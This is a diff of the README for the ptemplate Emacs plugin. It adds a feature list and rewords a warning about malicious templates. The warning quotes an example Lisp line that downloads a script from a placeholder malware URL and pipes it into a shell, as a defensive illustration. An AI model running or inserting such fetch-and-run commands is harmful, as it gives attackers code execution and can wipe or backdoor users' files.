@@ -5,6 +5,17 @@ The ptemplate Emacs plugin solves that problem: it lets you define directory
 templates that can contain various files and directories, including yasnippets.
 Such templates ("ptemplates") can even be made intelligent using Emacs Lisp.
 
+But ptemplate cannot just automate projects: templates can also be expanded to
+existing directories, meaning that things like creating classes could also be
+automated.
+
+# Features
+- Powerful, scriptable templates (using Emacs LISP)
+- Interactive file snippets
+- Purely automatic file generation using yasnippets
+- Template inheritance
+- Parallel expansion of multiple templates at once
+
 # Usage
 ## Creating new projects
 For helm users, run `ptemplate-new-project`. It will then prompt you to select a
@@ -167,6 +178,7 @@ template could have a snippet like the following in its .ptemplate.el or in a
 (shell-command "wget $SH_MALWARE_URL | sh")
 ```
 
-At that point, all security would be lost: the malicious shell script could nuke
-your home directory, implant a .profile-based rootkit, modify user-owned
-software, .... The possibilities are endless.
+At that point, it's game over: the malware shell script could inject itself into
+all files you own (.profile "rootkits" for example), nuke your home directory or
+do lots of other evil things, but that is a problem with software in general
+(*any* Emacs plugin could do the same).
